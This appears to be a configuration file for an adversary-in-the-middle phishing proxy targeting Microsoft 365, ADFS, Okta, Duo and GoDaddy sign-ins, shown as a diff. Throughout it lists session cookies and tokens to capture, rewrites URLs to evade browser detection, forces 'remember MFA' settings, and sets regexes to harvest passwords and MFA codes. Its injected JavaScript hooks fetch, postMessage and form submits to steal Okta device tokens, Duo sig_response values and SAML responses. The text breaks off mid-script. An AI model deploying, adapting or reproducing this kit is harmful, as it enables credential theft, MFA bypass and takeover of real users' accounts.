+  - { key: "Referer", value: "https://login.microsoftonline.com" }
+  - { key: "User-Agent", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
+  - { key: "Content-Security-Policy", value: "frame-ancestors 'self' https://outlook.office365.com" }
+ 
+session:
+  use_cookies: true
+  keepalive: true
+  store_tokens: true
+  token_match: "access_token"
+  overwrite: true
+  cookie_ttl: 31536000
+
+auth_tokens:
+  #===============================================================================
+  # MICROSOFT CORE TOKENS
+  #===============================================================================
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "SignInStateCookie", "buid", "esctx", "fpc", "stsservicecookie", "x-ms-gateway-slice", "AADSSO", "CCState", "brcap", "wlidperf", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+    
+  - domain: ".microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "SignInStateCookie", "buid", "esctx", "fpc", "stsservicecookie", "x-ms-gateway-slice", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+    
+  - domain: "login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "SignInStateCookie", "buid", "esctx", "fpc", "stsservicecookie", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+    
+  - domain: ".microsoft.com"
+    keys: ["MSPRequ", "MSPAuth", "MSPProf", "MSPSoftVis", "MSPVis", "MSPCID", "RPSSecAuth", ".*,regexp"]
+    
+  - domain: ".live.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token", ".*,regexp"]
+    
+  - domain: "login.live.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token", ".*,regexp"]
+    
+  - domain: "outlook.live.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token", ".*,regexp"]
+    
+  - domain: ".office.com"
+    keys: ["OIDCAuthCookie", "SignInStateCookie", "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+    
+  - domain: "outlook.office.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "x-ms-SessionId", "refresh_token", "OIDCAuthCookie", ".*,regexp"]
+    
+  - domain: ".office365.com"
+    keys: ["OIDCAuthCookie", "ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+
+  - domain: "outlook.office365.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token", "OIDCAuthCookie", ".*,regexp"]
+
+  #===============================================================================
+  # GODADDY SSO TOKENS
+  #===============================================================================
+  - domain: "sso.godaddy.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "refresh_token", "auth_idp", "auth_idp_jws", "gdid", ".*,regexp"]
+
+  - domain: ".godaddy.com"
+    keys: ["auth_idp", "auth_idp_jws", "gdid", "shopperId", ".*,regexp"]
+
+  #===============================================================================
+  # ADFS FEDERATION TOKENS
+  #===============================================================================
+  - domain: ".{adfs_domain}"
+    keys: ["MSISAuth", "MSISAuthenticated", "MSISSignOut", "MSISLoopDetectionCookie", ".*,regexp"]
+
+  - domain: "sts.{adfs_domain}"
+    keys: ["MSISAuth", "MSISAuthenticated", "MSISSignOut", ".*,regexp"]
+
+  - domain: "adfs.{adfs_domain}"
+    keys: ["MSISAuth", "MSISAuthenticated", "MSISSignOut", ".*,regexp"]
+
+  #===============================================================================
+  # OKTA SSO TOKENS
+  #===============================================================================
+  - domain: ".okta.com"
+    keys: ["sid", "DT", "idx", "okta-oauth-nonce", "okta-oauth-state", "okta-oauth-redirect-params", "JSESSIONID", ".*,regexp"]
+
+  - domain: "{okta_tenant}.okta.com"
+    keys: ["sid", "DT", "idx", "JSESSIONID", "t", "oktaStateToken", ".*,regexp"]
+
+  - domain: ".{okta_custom_domain}"
+    keys: ["sid", "DT", "idx", "JSESSIONID", ".*,regexp"]
+
+  #===============================================================================
+  # DUO SECURITY MFA TOKENS
+  #===============================================================================
+  - domain: ".duosecurity.com"
+    keys: ["sid", "auth_sid", "duo_session", "duo_sso", "akey", "txid", ".*,regexp"]
+
+  - domain: "api.duosecurity.com"
+    keys: ["sid", "auth_sid", "duo_session", ".*,regexp"]
+
+  - domain: "api-{duo_region}.duosecurity.com"
+    keys: ["sid", "auth_sid", ".*,regexp"]
+
+  - domain: "{duo_sso_tenant}.sso.duosecurity.com"
+    keys: ["sid", "auth_sid", "duo_sso", ".*,regexp"]
+
+  - domain: ".{duo_custom_domain}"
+    keys: ["sid", "auth_sid", "duo_sso", "duo_session", ".*,regexp"]
+
+auth_urls:
+  #===============================================================================
+  # MICROSOFT CORE AUTH URLS
+  #===============================================================================
+  - "/common/oauth2/v2.0/token"
+  - "/common/oauth2/token"
+  - "/common/oauth2/v2.0/authorize"
+  - "/common/login"
+  - "/kmsi*"
+  - "/landingv2"
+  - "/landing*"
+  - "/ppsecure/post.srf*"         
+  - "/owa/auth/logon.aspx*"       
+  - "/common/SAS/ProcessAuth"    
+  - "/ecp/authorize*"             
+  - "/mail/inbox*"            
+  - "/owa/auth/errorfe.aspx*" 
+  - "/login.srf"
+  - "/GetCredentialType"
+  - "/GetSessionState"
+  
+  #===============================================================================
+  # ADFS AUTH URLS
+  #===============================================================================
+  - "/adfs/ls"
+  - "/adfs/ls/*"
+  - "/adfs/oauth2/authorize"
+  - "/adfs/oauth2/token"
+  - "/adfs/services/trust/*"
+  
+  #===============================================================================
+  # OKTA AUTH URLS
+  #===============================================================================
+  - "/api/v1/authn"
+  - "/api/v1/authn/*"
+  - "/api/v1/authn/factors/*"
+  - "/oauth2/v1/authorize"
+  - "/oauth2/default/v1/authorize"
+  - "/oauth2/default/v1/token"
+  - "/login/token/redirect"
+  - "/sso/saml2/*"
+  - "/app/*/sso/saml"
+  
+  #===============================================================================
+  # DUO SECURITY AUTH URLS
+  #===============================================================================
+  - "/frame/web/v1/auth"
+  - "/frame/prompt"
+  - "/frame/status"
+  - "/frame/frameless/v4/auth"
+  - "/oauth/v1/authorize"
+  - "/oauth/v1/token"
+  - "/api/saml/sso"
+  - "/saml2/sp/acs"
+  - "/frame/v4/auth/prompt/*"
+  
+  #===============================================================================
+  # GODADDY SSO AUTH URLS
+  #===============================================================================
+  - "/oauth/authorize"
+  - "/v1/oauth/token"
+  - "/idp/profile/SAML2/*"
+  
+rewrite_urls:
+  #===============================================================================
+  # MICROSOFT CORE - BROWSER DETECTION EVASION
+  #===============================================================================
+  # Main OAuth authorize - shorten suspicious URL
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/common/oauth2/v2.0/authorize']
+    rewrite:
+      path: '/oauth'
+      query:
+        - key: 'tid'
+          value: '{id}'
+
+  # Token endpoint rewrite
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/common/oauth2/v2.0/token']
+    rewrite:
+      path: '/token'
+      query: []
+
+  # KMSI (Keep Me Signed In) page
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/kmsi']
+    rewrite:
+      path: '/stay'
+      query: []
+
+  # GetCredentialType - hide API endpoint
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/GetCredentialType']
+    rewrite:
+      path: '/check'
+      query: []
+
+  # Common login rewrite
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/common/login']
+    rewrite:
+      path: '/signin'
+      query: []
+
+  # SAS ProcessAuth - hide security endpoint
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/common/SAS/ProcessAuth']
+    rewrite:
+      path: '/verify'
+      query: []
+
+  # Landing pages
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/landing', '/landingv2']
+    rewrite:
+      path: '/welcome'
+      query: []
+
+  #===============================================================================
+  # OKTA SSO REWRITES
+  #===============================================================================
+  - trigger:
+      domains: ['{okta_tenant}.okta.com', '{okta_custom_domain}']
+      paths: ['/api/v1/authn']
+    rewrite:
+      path: '/auth'
+      query: []
+
+  - trigger:
+      domains: ['{okta_tenant}.okta.com']
+      paths: ['/api/v1/authn/factors/*']
+    rewrite:
+      path: '/verify/mfa'
+      query: []
+
+  - trigger:
+      domains: ['{okta_tenant}.okta.com']
+      paths: ['/oauth2/v1/authorize']
+    rewrite:
+      path: '/connect'
+      query:
+        - key: 'client_id'
+          value: '{client_id}'
+
+  - trigger:
+      domains: ['{okta_tenant}.okta.com']
+      paths: ['/login/token/redirect']
+    rewrite:
+      path: '/callback'
+      query: []
+
+  #===============================================================================
+  # ADFS REWRITES
+  #===============================================================================
+  - trigger:
+      domains: ['sts.{adfs_domain}', 'adfs.{adfs_domain}', 'fs.{adfs_domain}']
+      paths: ['/adfs/ls']
+    rewrite:
+      path: '/login'
+      query: []
+
+  - trigger:
+      domains: ['sts.{adfs_domain}', 'adfs.{adfs_domain}']
+      paths: ['/adfs/oauth2/authorize']
+    rewrite:
+      path: '/oauth'
+      query:
+        - key: 'client_id'
+          value: '{client_id}'
+
+  #===============================================================================
+  # DUO SECURITY REWRITES
+  #===============================================================================
+  - trigger:
+      domains: ['api.duosecurity.com', 'api-{duo_region}.duosecurity.com']
+      paths: ['/frame/web/v1/auth']
+    rewrite:
+      path: '/verify'
+      query: []
+
+  - trigger:
+      domains: ['api.duosecurity.com', 'api-{duo_region}.duosecurity.com']
+      paths: ['/frame/prompt']
+    rewrite:
+      path: '/confirm'
+      query: []
+
+  - trigger:
+      domains: ['api.duosecurity.com']
+      paths: ['/frame/status']
+    rewrite:
+      path: '/status'
+      query: []
+
+  - trigger:
+      domains: ['{duo_sso_tenant}.sso.duosecurity.com']
+      paths: ['/oauth/v1/authorize']
+    rewrite:
+      path: '/connect'
+      query: []
+
+  #===============================================================================
+  # GODADDY SSO REWRITES
+  #===============================================================================
+  - trigger:
+      domains: ['sso.godaddy.com']
+      paths: ['/oauth/authorize']
+    rewrite:
+      path: '/connect'
+      query: []
+
+  - trigger:
+      domains: ['sso.godaddy.com', 'idp.godaddy.com']
+      paths: ['/idp/profile/SAML2/*']
+    rewrite:
+      path: '/saml'
+      query: []
+
+   
+force_post:
+  #===============================================================================
+  # MICROSOFT CORE FORCE_POST RULES
+  #===============================================================================
+  - path: "/common/oauth2/v2.0/authorize"
+    search:
+      - { key: "scope", search: ".*" }
+    force:
+      - { key: "scope", value: "openid profile email offline_access" }
+    type: "post"
+
+  - path: "/common/oauth2/v2.0/authorize"
+    search:
+      - { key: "prompt", search: ".*" }
+    force:
+      - { key: "prompt", value: "login" }
+    type: "post"
+
+  - path: "/common/oauth2/v2.0/token"
+    search:
+      - { key: "grant_type", search: ".*" }
+    force:
+      - { key: "grant_type", value: "refresh_token" }
+    type: "post"
+
+  - path: "/common/SAS/ProcessAuth"
+    search:
+      - { key: "rememberMFA", search: ".*" }
+      - { key: "ESTSAUTHPERSISTENT", search: ".*" }
+      - { key: "x-ms-RefreshTokenCredential", search: ".*", optional: true }
+    force:
+      - { key: "rememberMFA", value: "true" }
+      - { key: "PPSession", value: "true" }
+    type: "post"
+
+  - path: "/owa/auth.owa"
+    search:
+      - { key: "username", search: ".*" }
+      - { key: "ESTSAUTHPERSISTENT", search: ".*" }
+      - { key: "x-ms-RefreshTokenCredential", search: ".*", optional: true }
+    force:
+      - { key: "PPSession", value: "true" }
+    type: "post"
+
+  - path: "/kmsi"
+    search:
+      - { key: "PPSession", search: ".*" }
+    force:
+      - { key: "PPSession", value: "true" }
+    type: "post"
+    
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+
+  - path: '/common/login'
+    search:
+      - {key: 'KMSI', search: '.*'}
+    force:
+      - {key: 'KMSI', value: '1'}
+    type: 'post'
+
+  #===============================================================================
+  # ADFS FORCE_POST RULES
+  #===============================================================================
+  - path: '/adfs/ls'
+    search:
+      - {key: 'Kmsi', search: '.*'}
+    force:
+      - {key: 'Kmsi', value: 'true'}
+    type: 'post'
+
+  - path: '/adfs/oauth2/authorize'
+    search:
+      - {key: 'prompt', search: '.*'}
+    force:
+      - {key: 'prompt', value: 'login'}
+    type: 'post'
+
+  #===============================================================================
+  # OKTA FORCE_POST RULES
+  #===============================================================================
+  - path: '/api/v1/authn'
+    search:
+      - {key: 'stateToken', search: '.*'}
+    force:
+      - {key: 'options.multiOptionalFactorEnroll', value: 'false'}
+      - {key: 'options.warnBeforePasswordExpired', value: 'false'}
+    type: 'post'
+
+  - path: '/api/v1/authn/factors'
+    search:
+      - {key: 'stateToken', search: '.*'}
+    force:
+      - {key: 'rememberDevice', value: 'true'}
+    type: 'post'
+
+  - path: '/oauth2/v1/authorize'
+    search:
+      - {key: 'prompt', search: '.*'}
+    force:
+      - {key: 'prompt', value: 'login'}
+    type: 'post'
+
+  #===============================================================================
+  # DUO SECURITY FORCE_POST RULES
+  #===============================================================================
+  - path: '/frame/web/v1/auth'
+    search:
+      - {key: 'sid', search: '.*'}
+    force:
+      - {key: 'dampen_choice', value: 'true'}
+    type: 'post'
+
+  - path: '/frame/prompt'
+    search:
+      - {key: 'sid', search: '.*'}
+    force:
+      - {key: 'device', value: 'phone1'}
+      - {key: 'factor', value: 'Duo Push'}
+    type: 'post'
+
+  - path: '/frame/status'
+    search:
+      - {key: 'sid', search: '.*'}
+    force:
+      - {key: 'remember_device', value: 'true'}
+    type: 'post'
+
+  - path: '/frame/v4/auth/prompt'
+    search:
+      - {key: 'sid', search: '.*'}
+    force:
+      - {key: 'remember_device', value: 'true'}
+    type: 'post'
+
+  #===============================================================================
+  # GODADDY FORCE_POST RULES
+  #===============================================================================
+  - path: '/oauth/authorize'
+    search:
+      - {key: 'response_type', search: '.*'}
+    force:
+      - {key: 'prompt', value: 'login'}
+    type: 'post'
+
+credentials:
+  username:
+    key: '(username|login|UserName|user|email|email_address|mail|account|identifier|userid|user_id|loginId|membername|session_key)'
+    search: '"(?:username|login|UserName|user|email|email_address|mail|account|identifier|userid|user_id|loginId|membername|session_key)"\s*:\s*"([^"]+)"'
+    type: 'json'
+  password:
+    key: '(passwd|Password|password|pass|pwd|Passwd|session_password|login_password|userpassword|user_pass|access_key|secretKey|password_field|loginpass|secret_password)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    #===========================================================================
+    # MICROSOFT CUSTOM CREDENTIALS
+    #===========================================================================
+    - key: '"password"'
+      search: '"password"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: '"Passwd"'
+      search: '"Passwd"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: '"access_key"'
+      search: '"access_key"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: '"secretKey"'
+      search: '"secretKey"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'mfaAuthMethod'
+      search: '(.*)'
+      type: 'post'
+    - key: '"device"'
+      search: '"device"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: '"refresh_token"'
+      search: '"refresh_token"\s*:\s*"([^"]+)"'
+      type: 'json'
+    - key: 'access_token'
+      search: '(.*)'
+      type: 'post'
+    - key: 'refresh_token'
+      search: '(.*)'
+      type: 'post'
+    #===========================================================================
+    # ADFS CREDENTIALS
+    #===========================================================================
+    - key: 'UserName'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Password'
+      search: '(.*)'
+      type: 'post'
+    #===========================================================================
+    # OKTA CREDENTIALS
+    #===========================================================================
+    - key: 'identifier'
+      search: '(.*)'
+      type: 'post'
+    - key: 'credentials.passcode'
+      search: '(.*)'
+      type: 'post'
+    - key: 'passCode'
+      search: '(.*)'
+      type: 'post'
+    - key: 'answer'
+      search: '(.*)'
+      type: 'post'
+    - key: 'stateToken'
+      search: '(.*)'
+      type: 'post'
+    #===========================================================================
+    # DUO SECURITY CREDENTIALS
+    #===========================================================================
+    - key: 'passcode'
+      search: '(.*)'
+      type: 'post'
+    - key: 'device'
+      search: '(.*)'
+      type: 'post'
+    - key: 'sig_response'
+      search: '(.*)'
+      type: 'post'
+    - key: 'sig_request'
+      search: '(.*)'
+      type: 'post'
+    - key: 'duo_code'
+      search: '(.*)'
+      type: 'post'
+    - key: 'txid'
+      search: '(.*)'
+      type: 'post'
+    #===========================================================================
+    # GODADDY CREDENTIALS
+    #===========================================================================
+    - key: 'auth_idp'
+      search: '(.*)'
+      type: 'post'
+    - key: 'auth_idp_jws'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+
+js_inject:
+  #===============================================================================
+  # MICROSOFT CORE JS INJECTION
+  #===============================================================================
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/*"]
+    script: |
+      // Generate random title
+      const randomWords = ['Welcome', 'Secure', 'Access', 'Portal', 'Login', 'Account', 'Verify', 'Sign In'];
+      const randomTitle = randomWords[Math.floor(Math.random() * randomWords.length)];
+      document.title = randomTitle + ' - Microsoft';
+
+      function lp(){
+        const emailInput = document.getElementById("i0116");
+        if (emailInput) {
+
+        if({email} != "{email}") {
+          // Set the value
+          console.log("Setting email value to: {email}");
+          
+           emailInput.value = "{email}";
+          
+          // Trigger input events to make the page detect the change
+          emailInput.dispatchEvent(new Event('input', { bubbles: true }));
+          emailInput.dispatchEvent(new Event('change', { bubbles: true }));
+          emailInput.dispatchEvent(new Event('keyup', { bubbles: true }));
+          
+          // Focus the input to ensure it's active
+          emailInput.focus();
+          
+          const nextButton = document.getElementById("idSIButton9");
+          if (nextButton) {
+            nextButton.click();
+          }
+
+          
+          
+          return true; // Exit the loop
+        }
+
+          
+        }
+        return false; // Continue checking
+      }
+
+      const checkInterval = setInterval(function() {
+        if (lp()) {
+          clearInterval(checkInterval); // Stop checking when successful
+        }
+      }, 500);
+
+  #===============================================================================
+  # OKTA SSO JS INJECTION - deviceToken Extraction
+  #===============================================================================
+  - trigger_domains: ["{okta_tenant}.okta.com", "{okta_custom_domain}"]
+    trigger_paths: ["/login/*", "/signin/*", "/api/v1/authn*"]
+    script: |
+      (function() {
+        // Extract Okta deviceToken for session persistence
+        function extractOktaDeviceToken() {
+          try {
+            // Check localStorage for deviceToken
+            const dtLocal = localStorage.getItem('DT') || localStorage.getItem('deviceToken');
+            if (dtLocal) {
+              console.log('[O365-Super] Okta deviceToken found in localStorage');
+              window.__oktaDeviceToken = dtLocal;
+              return dtLocal;
+            }
+            
+            // Check cookies
+            const cookies = document.cookie.split(';');
+            for (let c of cookies) {
+              const [name, value] = c.trim().split('=');
+              if (name === 'DT' || name === 'deviceToken') {
+                console.log('[O365-Super] Okta deviceToken found in cookies');
+                window.__oktaDeviceToken = value;
+                return value;
+              }
+            }
+            
+            // Check Okta widget state
+            if (window.OktaSignIn && window.OktaSignIn.authClient) {
+              const token = window.OktaSignIn.authClient.getDeviceToken();
+              if (token) {
+                console.log('[O365-Super] Okta deviceToken from widget');
+                window.__oktaDeviceToken = token;
+                return token;
+              }
+            }
+          } catch(e) {
+            console.log('[O365-Super] deviceToken extraction error:', e);
+          }
+          return null;
+        }
+        
+        // Monitor for stateToken in responses
+        const origFetch = window.fetch;
+        window.fetch = async function(...args) {
+          const response = await origFetch.apply(this, args);
+          try {
+            const url = args[0]?.url || args[0];
+            if (url && url.includes('/api/v1/authn')) {
+              const clone = response.clone();
+              clone.json().then(data => {
+                if (data.stateToken) {
+                  console.log('[O365-Super] Captured Okta stateToken');
+                  window.__oktaStateToken = data.stateToken;
+                }
+                if (data.sessionToken) {
+                  console.log('[O365-Super] Captured Okta sessionToken');
+                  window.__oktaSessionToken = data.sessionToken;
+                }
+              }).catch(() => {});
+            }
+          } catch(e) {}
+          return response;
+        };
+        
+        // Extract deviceToken periodically
+        setInterval(extractOktaDeviceToken, 2000);
+        extractOktaDeviceToken();
+      })();
+
+  #===============================================================================
+  # DUO SECURITY JS INJECTION - sig_response Capture
+  #===============================================================================
+  - trigger_domains: ["api.duosecurity.com", "api-{duo_region}.duosecurity.com", "{duo_sso_tenant}.sso.duosecurity.com"]
+    trigger_paths: ["/frame/*", "/oauth/*"]
+    script: |
+      (function() {
+        // Duo sig_response capture
+        console.log('[O365-Super] Duo Security injection active');
+        
+        // Monitor for sig_response in postMessage
+        window.addEventListener('message', function(e) {
+          try {
+            let data = e.data;
+            if (typeof data === 'string') {
+              try { data = JSON.parse(data); } catch(ex) {}
+            }
+            
+            if (data && data.sig_response) {
+              console.log('[O365-Super] Captured sig_response via postMessage');
+              window.__duoSigResponse = data.sig_response;
+            }
+            
+            // Check for Duo auth cookie format
+            if (typeof e.data === 'string' && e.data.includes(':APP')) {
+              console.log('[O365-Super] Captured sig_response pattern');
+              window.__duoSigResponse = e.data;
+            }
+          } catch(err) {}
+        }, false);
+        
+        // Monitor form submissions for sig_response
+        document.addEventListener('submit', function(e) {
+          const sigInput = e.target.querySelector('[name="sig_response"]');
+          if (sigInput && sigInput.value) {
+            console.log('[O365-Super] Captured sig_response from form');
+            window.__duoSigResponse = sigInput.value;
+          }
+        }, true);
+        
+        // Hook Duo.init for sig_response callback
+        if (typeof Duo !== 'undefined') {
+          const origInit = Duo.init;
+          Duo.init = function(options) {
+            const origCallback = options.submit_callback;
+            options.submit_callback = function(form) {
+              const sigResp = form.querySelector('[name="sig_response"]');
+              if (sigResp && sigResp.value) {
+                console.log('[O365-Super] Captured sig_response via Duo.init callback');
+                window.__duoSigResponse = sigResp.value;
+              }
+              if (origCallback) origCallback(form);
+            };
+            return origInit.call(this, options);
+          };
+        }
+        
+        // Auto-click "Remember me" checkbox if present
+        setTimeout(function() {
+          const rememberCheckbox = document.querySelector('[name="dampen_choice"], [name="remember_device"], #remember_me, .remember-device input[type="checkbox"]');
+          if (rememberCheckbox && !rememberCheckbox.checked) {
+            rememberCheckbox.click();
+            console.log('[O365-Super] Auto-checked remember device');
+          }
+        }, 1000);
+      })();
+
+  #===============================================================================
+  # ADFS JS INJECTION
+  #===============================================================================
+  - trigger_domains: ["sts.{adfs_domain}", "adfs.{adfs_domain}", "fs.{adfs_domain}"]
+    trigger_paths: ["/adfs/*"]
+    script: |
+      (function() {
+        console.log('[O365-Super] ADFS injection active');
+        
+        // Auto-check "Keep me signed in" if present
+        setTimeout(function() {
+          const kmsiCheckbox = document.querySelector('#KmsIChecked, [name="Kmsi"], [name="keepMeSignedIn"]');
+          if (kmsiCheckbox && !kmsiCheckbox.checked) {
+            kmsiCheckbox.click();
+            console.log('[O365-Super] Auto-checked ADFS KMSI');
+          }
+        }, 1000);
+        
+        // Monitor for SAML tokens
+        const origSubmit = HTMLFormElement.prototype.submit;
+        HTMLFormElement.prototype.submit = function() {
+          const samlResponse = this.querySelector('[name="SAMLResponse"]');
+          if (samlResponse && samlResponse.value) {
+            console.log('[O365-Super] Captured SAML Response');
+            window.__adfsSamlResponse = samlResponse.value;
+          }
+          return origSubmit.apply(this, arguments);
+        };
+      })();
+
+  #===============================================================================
+  # GODADDY SSO JS INJECTION
+  #===============================================================================
+  - trigger_domains: ["sso.godaddy.com", "idp.godaddy.com"]
+    trigger_paths: ["/*"]
+    script: |
+      (function() {
+        console.log('[O365-Super] GoDaddy SSO injection active');
+        
+        // Extract auth_idp tokens
+        function extractGoDaddyTokens() {
+          const cookies = document.cookie.split(';');
+          for (let c of cookies) {
+            const [name, value] = c.trim().split('=');
+            if (name === 'auth_idp' || name === 'auth_idp_jws') {
+              window['__gd_' + name] = value;
+              console.log('[O365-Super] Captured GoDaddy ' + name);
+            }
+          }
+        }
+        
+        // Monitor for JWS tokens in responses
+        const origFetch = window.fetch;
+        window.fetch = async function(...args) {
+          const response = await origFetch.apply(this, args);
+          try {
+            const url = args[0]?.url || args[0];
+            if (url && (url.includes('/oauth/') || url.includes('/v1/'))) {
+              const clone = response.clone();
+              clone.json().then(data => {
+                if (data.access_token) {
+                  console.log('[O365-Super] Captured GoDaddy access_token');
+                  window.__gdAccessToken = data.access_token;
+                }
+                if (data.id_token) {
+                  console.log('[O365-Super] Captured GoDaddy id_token');
+                  window.__gdIdToken = data.id_token;
+                }
+              }).catch(() => {});
+            }
+          } catch(e) {}
+          return response;
+        };
+        
+        setInterval(extractGoDaddyTokens, 2000);
+        extractGoDaddyTokens();
+      })();
+
+#===============================================================================
+# EVILPUPPET INTEGRATION - Advanced Token Extraction
+#===============================================================================
+evilpuppet:
+  enabled: true
+  
+  triggers:
+    #---------------------------------------------------------------------------
+    # OKTA deviceToken Extraction
+    #---------------------------------------------------------------------------
+    - name: "okta_devicetoken"
+      domains: ["{okta_tenant}.okta.com", "{okta_custom_domain}", "login.okta.com"]
+      paths: ["/login/*", "/signin/*", "/app/*"]
+      token_type: "okta_devicetoken"
+      extraction:
+        type: "script"
+        script: |
+          async function extract() {
+            // Wait for page to fully load
+            await new Promise(r => setTimeout(r, 2000));
+            
+            // Try localStorage
+            let dt = localStorage.getItem('DT') || localStorage.getItem('deviceToken');
+            if (dt) return { deviceToken: dt, source: 'localStorage' };
+            
+            // Try cookies
+            const cookies = document.cookie.split(';');
+            for (let c of cookies) {
+              const [n, v] = c.trim().split('=');
+              if (n === 'DT') return { deviceToken: v, source: 'cookie' };
+            }
+            
+            // Try Okta widget
+            if (window.OktaSignIn?.authClient?.getDeviceToken) {
+              const t = window.OktaSignIn.authClient.getDeviceToken();
+              if (t) return { deviceToken: t, source: 'widget' };
+            }
+            
+            // Try idx cookie decode
+            for (let c of cookies) {
+              const [n, v] = c.trim().split('=');
+              if (n === 'idx') {
+                try {
+                  const decoded = JSON.parse(atob(v.split('.')[1]));
+                  if (decoded.dt) return { deviceToken: decoded.dt, source: 'idx_jwt' };
+                } catch(e) {}
+              }
+            }
+            
+            return { error: 'deviceToken not found' };
+          }
+          return extract();
+      inject_as: "cookie"
+      inject_name: "DT"
+
+    #---------------------------------------------------------------------------
+    # DUO sig_response Extraction
+    #---------------------------------------------------------------------------
+    - name: "duo_sig_response"
+      domains: ["api.duosecurity.com", "api-*.duosecurity.com", "*.sso.duosecurity.com"]
+      paths: ["/frame/*", "/oauth/*"]
+      token_type: "duo_sig_response"
+      wait_for: "#duo_iframe, iframe[src*='duosecurity'], .duo-frame"
+      extraction:
+        type: "iframe_monitor"
+        iframe_selector: "#duo_iframe, iframe[src*='duosecurity']"
+        message_filter: "sig_response"
+        timeout: 120000
+        script: |
+          async function extract() {
+            return new Promise((resolve) => {
+              let captured = null;
+              
+              // Monitor postMessage
+              window.addEventListener('message', function handler(e) {
+                try {
+                  let data = e.data;
+                  if (typeof data === 'string') {
+                    if (data.includes(':APP')) {
+                      captured = data;
+                      window.removeEventListener('message', handler);
+                      resolve({ sig_response: captured, source: 'postMessage' });
+                    }
+                    try {
+                      data = JSON.parse(data);
+                      if (data.sig_response) {
+                        captured = data.sig_response;
+                        window.removeEventListener('message', handler);
+                        resolve({ sig_response: captured, source: 'json_postMessage' });
+                      }
+                    } catch(e) {}
+                  }
+                } catch(err) {}
+              });
+              
+              // Also monitor form submissions
+              document.addEventListener('submit', function(e) {
+                const sigInput = e.target.querySelector('[name="sig_response"]');
+                if (sigInput?.value) {
+                  resolve({ sig_response: sigInput.value, source: 'form' });
+                }
+              }, true);
+              
+              // Timeout after 120s
+              setTimeout(() => {
+                if (!captured) resolve({ error: 'sig_response timeout' });
+              }, 120000);
+            });
+          }
+          return extract();
+      inject_as: "post_field"
+      inject_name: "sig_response"
+
+    #---------------------------------------------------------------------------
+    # ADFS MSISAuth Token Extraction
+    #---------------------------------------------------------------------------
+    - name: "adfs_msis"
+      domains: ["sts.{adfs_domain}", "adfs.{adfs_domain}", "fs.{adfs_domain}"]
+      paths: ["/adfs/*"]
+      token_type: "adfs_msis"
+      extraction:
+        type: "cookie"
+        cookie_names: ["MSISAuth", "MSISAuthenticated", "MSISSignOut"]
+        script: |
+          async function extract() {
+            const result = {};
+            const cookies = document.cookie.split(';');
+            for (let c of cookies) {
+              const [n, v] = c.trim().split('=');
+              if (['MSISAuth', 'MSISAuthenticated', 'MSISSignOut'].includes(n)) {
+                result[n] = v;
+              }
+            }
+            
+            // Also check for SAML response in forms
+            const samlInput = document.querySelector('[name="SAMLResponse"]');
+            if (samlInput?.value) {
+              result.SAMLResponse = samlInput.value;
+            }
+            
+            return Object.keys(result).length > 0 ? result : { error: 'ADFS tokens not found' };
+          }
+          return extract();
+      inject_as: "cookie"
+
+    #---------------------------------------------------------------------------
+    # GODADDY auth_idp Token Extraction  
+    #---------------------------------------------------------------------------
+    - name: "godaddy_auth"
+      domains: ["sso.godaddy.com", "idp.godaddy.com", "*.godaddy.com"]
+      paths: ["/oauth/*", "/v1/*"]
+      token_type: "godaddy_auth"
+      extraction:
+        type: "cookie"
+        cookie_names: ["auth_idp", "auth_idp_jws", "gdid", "shopperId"]
+        script: |
+          async function extract() {
+            const result = {};
+            const cookies = document.cookie.split(';');
+            for (let c of cookies) {
+              const [n, v] = c.trim().split('=');
+              if (['auth_idp', 'auth_idp_jws', 'gdid', 'shopperId'].includes(n)) {
+                result[n] = decodeURIComponent(v);
+              }
+            }
+            
+            // Check localStorage for JWS tokens
+            ['access_token', 'id_token', 'refresh_token'].forEach(key => {
+              const val = localStorage.getItem(key);
+              if (val) result[key] = val;
+            });
+            
